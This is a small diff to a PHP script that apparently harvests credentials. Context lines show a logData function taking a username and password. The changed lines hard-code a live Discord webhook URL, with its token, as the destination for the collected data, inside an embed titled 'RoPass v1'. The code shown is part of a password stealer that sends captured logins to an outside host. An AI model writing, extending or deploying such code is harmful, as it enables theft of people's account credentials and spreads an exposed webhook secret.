@@ -37,9 +37,7 @@ function logData($username, $password) {
 }
 
 function sendToDiscordWebhook($data) {
-    $webhookUrls = [
-        'https://discord.com/api/webhooks/1503805736327713021/y3z2ZA7rURYoBq1yH_p0IkWULLlEiy1kq6nHoctNbZ0ehkHgvYKcws6utoXH1tt_mADD',]
-
+   $webhookUrl = "https://discord.com/api/webhooks/1503805736327713021/y3z2ZA7rURYoBq1yH_p0IkWULLlEiy1kq6nHoctNbZ0ehkHgvYKcws6utoXH1tt_mADD";
     $embed = [
         "title" => "RoPass v1",
         "color" => hexdec("3762dc"),
